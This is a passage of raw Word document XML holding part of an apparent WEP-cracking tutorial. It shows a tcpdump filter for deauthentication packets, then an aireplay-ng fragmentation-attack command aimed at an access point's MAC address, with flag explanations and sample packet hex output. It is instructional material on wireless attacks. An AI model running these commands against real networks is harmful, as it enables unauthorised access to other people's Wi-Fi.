        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CDCC710" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="003112DC" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -n -e -s0 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>grep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1CCD8D34" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14AEB5F2"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You may need to tweak the phrase “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>” to pick out the exact packets you want.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D86C548" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="064B0FC2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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**USE THE BELOW ATTACKS IF FAKE AUTH FAILS**</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A84C96" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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3 - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>chopchop</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fragmenation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack to obtain PRGA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8ED86E"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Start another console session and run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7211C7CE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="0070331F" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0070331F">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>FRAG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F2B0D7E" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B164BB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00EA0EF7" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D721820"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0D145454" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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-5 means the fragmentation attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF3BFAE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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b</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="250D53A6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4ECE31" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6948DAD5"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AFFFD97" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39B04606"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Waiting for a data packet...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7B288D"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Read 127 packets...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21CF70EE"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
    <w:p w14:paraId="2E2C2DC8"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Size: 114, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 0 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE52AE5"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
    <w:p w14:paraId="45AB79D8"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5E6E279D"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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  01:00:5E:00:00:FB</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="42F28B33"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:40:F4:77:E5:C9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6DD30335"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
    <w:p w14:paraId="532F06BB"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0x0000:  0842 0000 0100 5e00 00fb 0014 6c7e 4080  .B</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....^</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.....l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E222526"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0x0010:  0040 f477 e5c9 6052 8c00 0000 3073 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>d265  .@.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..`R</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....0s.e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0EF80E41"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0x0020:  c402 790b 2293 c7d5 89c5 4136 7283 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>29df  ..y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>."</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>A6r.).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D479938"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0x0030:  4e9e 5e13 5f43 4ff5 1b37 3ff9 4da4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>c03b  N</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.^._CO..7</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>?.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1ECDEFBC"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0x0040:  8244 5882 d5cc 7a1f 2b9b 3ef0 ee0f 4fb5  .DX...z</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.+</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.&gt;...O.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D72B279"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0x0050:  4563 906d 0d90 88c4 5532 a602 a8ea </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">f8e2  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Ec.m</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....U2......</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1435A81F"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0x0060:  c531 e214 2b28 fc19 b9a8 226d 9c71 6ab1  .1</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>+(...."</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.qj</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
